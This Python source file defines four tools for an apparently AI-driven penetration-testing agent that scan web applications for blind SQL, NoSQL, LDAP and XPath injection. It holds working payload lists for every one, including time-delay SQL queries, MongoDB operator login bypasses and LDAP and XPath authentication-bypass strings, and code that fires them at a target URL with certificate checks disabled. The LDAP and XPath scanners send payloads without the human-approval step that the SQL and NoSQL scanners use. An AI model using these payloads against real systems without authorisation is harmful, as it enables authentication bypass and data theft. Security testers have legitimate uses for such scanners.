import json
from core.tool_transport import guarded_requests as requests
import re
import urllib3
from urllib.parse import quote, urlparse
from core.tool_decorator import langchain_tool as tool
from core.rate_limiter import rate_limiter
from core.auth_store import auth_get, auth_post
from core.cancellation import check_cancelled
from core.checkpoint import require_approval
from core.auth_store import get_auth_kwargs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def _domain_of(url: str) -> str:
    try:
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url

def _logger():
    from tools.custom_tools import exec_logger
    return exec_logger


# ==========================================
# TOOL 1: Blind SQL Injection (Time & Boolean)
# ==========================================
@tool("blind_sqli_scanner")
def blind_sqli_scanner(url: str, params: str = "") -> str:
    """
    Scan for Blind SQL Injection (time-based dan boolean-based).
    Berguna ketika error-based SQLi not menampilkan error di response.
    params: comma-separated parameter names to test
    """
    tool_name = "Blind SQLi Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting blind SQLi scan on {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"Blind SQL Injection scan on {url}",
        context=f"Testing time-based (SLEEP) dan boolean-based payloads on params: {params or 'default'}",
        risk="medium",
        exec_logger=logger,
    )
    if not approved:
        logger.add_log(tool_name, "BLOCKED", "Cancelled: approval rejected")
        return "SCAN DIBATALKAN: human-in-the-loop approval rejected atau timeout."

    import time
    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    param_list = [p.strip() for p in params.split(",")] if params else ["id", "user_id", "q", "search", "page", "cat", "item"]

    vulnerabilities = []

    # ── COMPREHENSIVE TIME-BASED PAYLOADS ─────────────────────────────────────
    time_payloads = [
        # MySQL
        ("' AND SLEEP(4)-- -", "MySQL"),
        ("1 AND SLEEP(4)-- -", "MySQL"),
        ("' OR SLEEP(4)-- -", "MySQL"),
        ("1' AND SLEEP(4)#", "MySQL"),
        ("' AND SLEEP(4)#", "MySQL"),
        ("1 AND SLEEP(4)#", "MySQL"),
        ("' OR SLEEP(4)#", "MySQL"),
        ("'; SELECT SLEEP(4)-- -", "MySQL"),
        ("1; SELECT SLEEP(4)-- -", "MySQL"),
        ("' AND (SELECT * FROM (SELECT(SLEEP(4)))a)-- -", "MySQL"),
        ("' AND BENCHMARK(10000000,SHA1('test'))-- -", "MySQL"),
        ("1 AND BENCHMARK(10000000,SHA1('test'))-- -", "MySQL"),
        ("' OR BENCHMARK(10000000,SHA1('test'))-- -", "MySQL"),
        ("' AND (SELECT CASE WHEN (1=1) THEN SLEEP(4) ELSE 0 END)-- -", "MySQL"),
        ("1 AND (SELECT CASE WHEN (1=1) THEN SLEEP(4) ELSE 0 END)-- -", "MySQL"),
        # PostgreSQL
        ("'; SELECT pg_sleep(4)-- -", "PostgreSQL"),
        ("1; SELECT pg_sleep(4)-- -", "PostgreSQL"),
        ("' OR pg_sleep(4)-- -", "PostgreSQL"),
        ("1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(4) ELSE pg_sleep(0) END)-- -", "PostgreSQL"),
        ("' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(4) ELSE pg_sleep(0) END)-- -", "PostgreSQL"),
        # MSSQL
        ("1; WAITFOR DELAY '0:0:4'-- -", "MSSQL"),
        ("'; WAITFOR DELAY '0:0:4'-- -", "MSSQL"),
        ("' OR 1=1; WAITFOR DELAY '0:0:4'-- -", "MSSQL"),
        ("1 AND 1=(SELECT CASE WHEN (1=1) THEN WAITFOR DELAY '0:0:4' ELSE 0 END)-- -", "MSSQL"),
        # Oracle
        ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',4)-- -", "Oracle"),
        ("1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',4)-- -", "Oracle"),
        ("' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',4)-- -", "Oracle"),
        # SQLite
        ("' AND 1=randomblob(400000000)-- -", "SQLite"),
        ("1 AND 1=randomblob(400000000)-- -", "SQLite"),
    ]

    # ── COMPREHENSIVE BOOLEAN-BASED PAYLOADS ──────────────────────────────────
    boolean_payloads = [
        # Standard true/false pairs
        ("' AND '1'='1", "' AND '1'='2"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("' OR 1=1-- -", "' OR 1=2-- -"),
        ("1' AND '1'='1'-- -", "1' AND '1'='2'-- -"),
        ("1 AND 1=1-- -", "1 AND 1=2-- -"),
        ("' AND 1=1-- -", "' AND 1=2-- -"),
        ("1 AND 'a'='a'-- -", "1 AND 'a'='b'-- -"),
        ("' AND 'a'='a'-- -", "' AND 'a'='b'-- -"),
        ("1 AND SUBSTRING('abc',1,1)='a'-- -", "1 AND SUBSTRING('abc',1,1)='b'-- -"),
        ("' AND SUBSTRING('abc',1,1)='a'-- -", "' AND SUBSTRING('abc',1,1)='b'-- -"),
        # Subquery-based
        ("1 AND (SELECT 1 FROM dual WHERE 1=1)=1-- -", "1 AND (SELECT 1 FROM dual WHERE 1=2)=1-- -"),
        ("' AND (SELECT COUNT(*) FROM users WHERE 1=1)>0-- -", "' AND (SELECT COUNT(*) FROM users WHERE 1=2)>0-- -"),
        # Time-delay confirmation (short delay)
        ("' AND (SELECT CASE WHEN (1=1) THEN SLEEP(1) ELSE 0 END)-- -", "' AND (SELECT CASE WHEN (1=2) THEN SLEEP(1) ELSE 0 END)-- -"),
    ]

    logger.add_log(tool_name, "PROCESSING", "Testing time-based blind SQLi")
    for param in param_list:
        if check_cancelled(logger): break
        for payload, db_type in time_payloads:
            try:
                # ── TIME CONSISTENCY CHECK ─────────────────────────────────
                # Kirim 3x for pastikan delay konsisten, bukan jitter
                delays = []
                for attempt in range(3):
                    rate_limiter.wait(domain)
                    start = time.monotonic()
                    r = auth_get(
                        f"{url}?{param}={quote(payload)}",
                        timeout=10, verify=False
                    )
                    elapsed = time.monotonic() - start
                    delays.append(elapsed)

                # Cek konsistensi: all delay must > threshold
                threshold = 3.5
                consistent_delays = [d for d in delays if d >= threshold]
                all_slow = len(consistent_delays) == 3
                majority_slow = len(consistent_delays) >= 2

                if all_slow:
                    # Semua request lambat = confirmed
                    avg_delay = sum(delays) / len(delays)
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload,
                        "db_type": db_type,
                        "type": "Blind SQLi (Time-Based)",
                        "evidence": f"Consistent delay: {avg_delay:.1f}s avg (3/3 slow)",
                        "severity": "Critical",
                        "confidence": "high",
                    })
                    logger.add_log(tool_name, "WARNING",
                        f"Blind SQLi (time) confirmed: param={param}, DB={db_type}, avg_delay={avg_delay:.1f}s")
                    break
                elif majority_slow:
                    # 2/3 lambat = kemungkinan besar TP tapi less confident
                    avg_delay = sum(delays) / len(delays)
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload,
                        "db_type": db_type,
                        "type": "Blind SQLi (Time-Based, Partial)",
                        "evidence": f"Partial delay: {avg_delay:.1f}s avg (2/3 slow)",
                        "severity": "High",
                        "confidence": "medium",
                    })
                    logger.add_log(tool_name, "WARNING",
                        f"Blind SQLi (time) partial: param={param}, DB={db_type}, {len(consistent_delays)}/3 slow")
                    break
                else:
                    # Kurang from 2/3 lambat = kemungkinan jitter/FP
                    logger.add_log(tool_name, "INFO",
                        f"Time test {param} inconclusive: only {len(consistent_delays)}/3 slow (likely jitter)")
                    continue

            except requests.Timeout:
                # ── TIMEOUT CONSISTENCY CHECK ───────────────────────────────
                # Timeout juga must sent 2x for konsistensi
                timeout_count = 0
                for _ in range(2):
                    try:
                        rate_limiter.wait(domain)
                        auth_get(
                            f"{url}?{param}={quote(payload)}",
                            timeout=10, verify=False
                        )
                    except requests.Timeout:
                        timeout_count += 1
                    except Exception:
                        pass

                if timeout_count >= 2:
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload,
                        "db_type": db_type,
                        "type": "Blind SQLi (Time-Based, Timeout)",
                        "evidence": f"Consistent timeout: {timeout_count + 1}/3 attempts",
                        "severity": "Critical",
                        "confidence": "high",
                    })
                    logger.add_log(tool_name, "WARNING", f"Blind SQLi timeout confirmed: param={param}")
                    break
                else:
                    logger.add_log(tool_name, "INFO",
                        f"Timeout test {param} inconclusive: only {timeout_count + 1}/3 timeouts")
            except Exception:
                pass

    logger.add_log(tool_name, "PROCESSING", "Testing boolean-based blind SQLi")
    for param in param_list:
        if check_cancelled(logger): break
        if any(v["parameter"] == param for v in vulnerabilities):
            continue  # already confirmed for this param

        for true_payload, false_payload in boolean_payloads:
            try:
                rate_limiter.wait(domain)
                r_true = auth_get(f"{url}?{param}={quote(true_payload)}", timeout=5, verify=False)
                rate_limiter.wait(domain)
                r_false = auth_get(f"{url}?{param}={quote(false_payload)}", timeout=5, verify=False)

                # Significant response difference between true and false condition
                len_diff = abs(len(r_true.text) - len(r_false.text))
                content_diff = r_true.text != r_false.text

                if len_diff > 50 and content_diff:
                    vulnerabilities.append({
                        "parameter": param,
                        "true_payload": true_payload,
                        "false_payload": false_payload,
                        "type": "Blind SQLi (Boolean-Based)",
                        "evidence": f"Response length diff: {len_diff} bytes between true/false conditions",
                        "severity": "Critical"
                    })
                    logger.add_log(tool_name, "WARNING",
                        f"Blind SQLi (boolean) possible: param={param}, diff={len_diff} bytes")
                    break
            except Exception:
                pass

    # ── SQLMAP CONFIRMATION STEP ──────────────────────────────────────────────
    if vulnerabilities:
        from tools.custom_tools import _run_sqlmap_confirmation
        confirmed_vulnerabilities = []
        
        for vuln in vulnerabilities:
            param = vuln["parameter"]
            logger.add_log(tool_name, "PROCESSING", f"Running sqlmap confirmation on {param}")
            
            sqlmap_result = _run_sqlmap_confirmation(url, param, logger)
            
            if sqlmap_result.get("is_confirmed"):
                vuln["sqlmap_confirmed"] = True
                vuln["severity"] = sqlmap_result.get("severity", "Critical")
                vuln["db_type"] = sqlmap_result.get("db_type", vuln.get("db_type", "Unknown"))
                vuln["injection_details"] = sqlmap_result.get("injection_details", [])
                confirmed_vulnerabilities.append(vuln)
                logger.add_log(tool_name, "WARNING",
                    f"sqlmap CONFIRMED: {param} is vulnerable ({vuln['db_type']})")
            else:
                vuln["sqlmap_confirmed"] = False
                vuln["severity"] = "Medium"
                vuln["note"] = "Detected by custom scanner, not confirmed by sqlmap"
                confirmed_vulnerabilities.append(vuln)
                logger.add_log(tool_name, "INFO",
                    f"sqlmap: {param} not confirmed - keeping as medium confidence finding")
        
        vulnerabilities = confirmed_vulnerabilities

    result = {
        "status": "VULNERABLE" if vulnerabilities else "SAFE",
        "vulnerabilities": vulnerabilities,
        "count": len(vulnerabilities),
        "params_tested": param_list
    }
    logger.add_log(tool_name, "SUCCESS", f"Blind SQLi scan complete. Found: {len(vulnerabilities)}")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 2: NoSQL Injection Scanner
# ==========================================
@tool("nosql_injection_scanner")
def nosql_injection_scanner(url: str, params: str = "") -> str:
    """
    Scan for NoSQL Injection (MongoDB, CouchDB).
    Test operator injection: $gt, $ne, $where, $regex patterns.
    params: comma-separated parameter names to test
    """
    tool_name = "NoSQL Injection Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting NoSQL injection scan on {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"NoSQL injection scan on {url}",
        context=f"Testing MongoDB operator injection payloads ($gt, $ne, $where)",
        risk="medium",
        exec_logger=logger,
    )
    if not approved:
        logger.add_log(tool_name, "BLOCKED", "Cancelled: approval rejected")
        return "SCAN DIBATALKAN: human-in-the-loop approval rejected atau timeout."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    param_list = [p.strip() for p in params.split(",")] if params else [
        "username", "password", "email", "id", "user", "search", "query"
    ]

    vulnerabilities = []

    # GET-based NoSQL payloads
    get_payloads = [
        # MongoDB operator injection
        ({"$gt": ""}, "MongoDB $gt operator"),
        ({"$ne": "invalid"}, "MongoDB $ne operator"),
        ({"$regex": ".*"}, "MongoDB $regex operator"),
        ("';return true;//", "MongoDB $where JS injection"),
        ("true, $where: '1==1", "MongoDB $where injection"),
        # Array injection
        (["admin", "invalid"], "Array injection"),
    ]

    # POST JSON-based payloads (most common for NoSQL)
    json_payloads = [
        # Auth bypass
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        '{"username": "admin", "password": {"$ne": "invalid"}}',
        '{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}',
        '{"$where": "this.username == this.username"}',
        '{"username": "admin\' || \'x\'==\'x", "password": "x"}',
    ]

    # Test GET params
    logger.add_log(tool_name, "PROCESSING", "Testing NoSQL injection via GET params")
    for param in param_list:
        if check_cancelled(logger): break
        for payload, payload_desc in get_payloads:
            try:
                rate_limiter.wait(domain)
                if isinstance(payload, dict):
                    # Send as array notation: param[$gt]=
                    for op, val in payload.items():
                        test_url = f"{url}?{param}[{op}]={quote(str(val))}"
                        r = auth_get(test_url, timeout=5, verify=False)
                        if r.status_code == 200 and any(kw in r.text.lower() for kw in
                            ["dashboard", "welcome", "profile", "logout", "success"]):
                            vulnerabilities.append({
                                "parameter": param,
                                "payload": f"{param}[{op}]={val}",
                                "description": payload_desc,
                                "type": "NoSQL Injection (GET)",
                                "severity": "Critical"
                            })
                            logger.add_log(tool_name, "WARNING", f"NoSQL injection confirmed: {payload_desc}")
                            break
            except Exception:
                pass

    # Test POST JSON
    logger.add_log(tool_name, "PROCESSING", "Testing NoSQL injection via POST JSON")
    for jp in json_payloads:
        if check_cancelled(logger): break
        try:
            rate_limiter.wait(domain)
            r = auth_post(
                url,
                data=jp,
                headers={"Content-Type": "application/json"},
                timeout=5, verify=False
            )
            if r.status_code == 200 and any(kw in r.text.lower() for kw in
                ["dashboard", "welcome", "profile", "logout", "success", "token", "authenticated"]):
                vulnerabilities.append({
                    "payload": jp,
                    "type": "NoSQL Injection (POST JSON)",
                    "evidence": r.text[:200],
                    "severity": "Critical"
                })
                logger.add_log(tool_name, "WARNING", "NoSQL injection via POST JSON confirmed!")
                break
        except Exception:
            pass

    result = {
        "status": "VULNERABLE" if vulnerabilities else "SAFE",
        "vulnerabilities": vulnerabilities,
        "count": len(vulnerabilities)
    }
    logger.add_log(tool_name, "SUCCESS", f"NoSQL injection scan complete. Found: {len(vulnerabilities)}")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 3: LDAP Injection Scanner
# ==========================================
@tool("ldap_injection_scanner")
def ldap_injection_scanner(url: str, params: str = "") -> str:
    """
    Scan for LDAP Injection vulnerability.
    Sering found di enterprise apps that pake LDAP authentication (Active Directory).
    params: comma-separated parameter names (biasanya username, user, email)
    """
    tool_name = "LDAP Injection Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting LDAP injection scan on {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    param_list = [p.strip() for p in params.split(",")] if params else [
        "username", "user", "email", "login", "uid", "cn"
    ]

    # LDAP injection payloads
    ldap_payloads = [
        ("*", "Wildcard — dump all users"),
        ("*)(uid=*))(|(uid=*", "Classic LDAP injection — auth bypass"),
        ("admin)(&)", "LDAP auth bypass"),
        ("*)(|(objectclass=*)", "Objectclass dump"),
        (")(|(password=*)", "Password attribute dump attempt"),
        ("admin*", "Wildcard prefix on admin"),
        ("*)(|(cn=*", "CN dump"),
        ("\\00", "Null byte injection"),
    ]

    vulnerabilities = []

    for param in param_list:
        if check_cancelled(logger): break
        for payload, description in ldap_payloads:
            try:
                rate_limiter.wait(domain)
                # Test GET
                r_get = auth_get(
                    f"{url}?{param}={quote(payload)}",
                    timeout=5, verify=False
                )
                # Test POST
                rate_limiter.wait(domain)
                r_post = auth_post(
                    url,
                    data={param: payload, "password": "anything"},
                    timeout=5, verify=False
                )

                # LDAP injection indicators:
                # 1. Login success with wildcard
                # 2. LDAP error messages leaked
                # 3. Different response compared to normal input

                ldap_error_patterns = [
                    "ldap", "ldap_search", "ldap_bind", "invalid dn syntax",
                    "invalid filter", "unwillingToPerform", "sizelimit exceeded",
                    "objectclass", "distinguishedName"
                ]

                for r in [r_get, r_post]:
                    if any(p in r.text.lower() for p in ldap_error_patterns):
                        vulnerabilities.append({
                            "parameter": param,
                            "payload": payload,
                            "description": description,
                            "type": "LDAP Error Disclosure / Injection",
                            "evidence": next((p for p in ldap_error_patterns if p in r.text.lower()), ""),
                            "severity": "High"
                        })
                        logger.add_log(tool_name, "WARNING", f"LDAP error disclosed: param={param}")
                        break

                    # Auth bypass check
                    if payload in ("*", "*)(uid=*))(|(uid=*") and r.status_code == 200:
                        if any(kw in r.text.lower() for kw in ["dashboard", "welcome", "logout", "profile"]):
                            vulnerabilities.append({
                                "parameter": param,
                                "payload": payload,
                                "description": description,
                                "type": "LDAP Authentication Bypass",
                                "severity": "Critical"
                            })
                            logger.add_log(tool_name, "WARNING", f"LDAP auth bypass: param={param}")
                            break

            except Exception:
                pass

    result = {
        "status": "VULNERABLE" if vulnerabilities else "SAFE",
        "vulnerabilities": vulnerabilities,
        "count": len(vulnerabilities),
        "note": "LDAP injection most common in enterprise apps with Active Directory auth"
    }
    logger.add_log(tool_name, "SUCCESS", f"LDAP injection scan complete. Found: {len(vulnerabilities)}")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 4: XPath Injection Scanner
# ==========================================
@tool("xpath_injection_scanner")
def xpath_injection_scanner(url: str, params: str = "") -> str:
    """
    Scan for XPath Injection vulnerability.
    XPath injection occurred di aplikasi that query XML data store using user input.
    params: comma-separated parameter names to test
    """
    tool_name = "XPath Injection Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting XPath injection scan on {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    param_list = [p.strip() for p in params.split(",")] if params else [
        "username", "user", "id", "search", "query", "name", "category"
    ]

    # XPath injection payloads
    xpath_payloads = [
        ("' or '1'='1", "Classic XPath auth bypass"),
        ("' or 1=1 or '1'='1", "Extended XPath bypass"),
        ("'] | //* | //*['", "XPath wildcard dump"),
        ("x' or name()='username", "Node name injection"),
        ("' or count(/*)>0 or '1'='1", "Boolean XPath probe"),
        ("admin' or 'a'='a", "Admin bypass"),
        ("1' and count(//user)>0 and '1'='1", "User enum probe"),
        ("' and count(//password)>0 and '", "Password node probe"),
    ]

    vulnerabilities = []
    xpath_error_patterns = [
        "xpath", "xquery", "xml query", "invalid expression",
        "syntax error in xpath", "expected token", "unterminated string"
    ]

    for param in param_list:
        if check_cancelled(logger): break
        for payload, description in xpath_payloads:
            try:
                rate_limiter.wait(domain)
                r = auth_get(
                    f"{url}?{param}={quote(payload)}",
                    timeout=5, verify=False
                )

                # Check for XPath errors (disclosure)
                if any(ep in r.text.lower() for ep in xpath_error_patterns):
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload,
                        "description": description,
                        "type": "XPath Error Disclosure",
                        "evidence": "XPath error message in response",
                        "severity": "Medium"
                    })
                    logger.add_log(tool_name, "WARNING", f"XPath error disclosed: param={param}")
                    break

                # Check for auth bypass
                if r.status_code == 200 and any(kw in r.text.lower() for kw in
                    ["dashboard", "welcome", "logout", "admin", "success"]):
                    rate_limiter.wait(domain)
                    # Verify by testing clearly wrong payload
                    r_normal = auth_get(
                        f"{url}?{param}={quote('normalvalue_xyz')}",
                        timeout=5, verify=False
                    )
                    if r_normal.status_code != 200 or r.text != r_normal.text:
                        vulnerabilities.append({
                            "parameter": param,
                            "payload": payload,
                            "description": description,
                            "type": "XPath Authentication Bypass",
                            "severity": "Critical"
                        })
                        logger.add_log(tool_name, "WARNING", f"XPath auth bypass: param={param}")
                        break
            except Exception:
                pass

    result = {
        "status": "VULNERABLE" if vulnerabilities else "SAFE",
        "vulnerabilities": vulnerabilities,
        "count": len(vulnerabilities)
    }
    logger.add_log(tool_name, "SUCCESS", f"XPath injection scan complete. Found: {len(vulnerabilities)}")
    return json.dumps(result, indent=2)
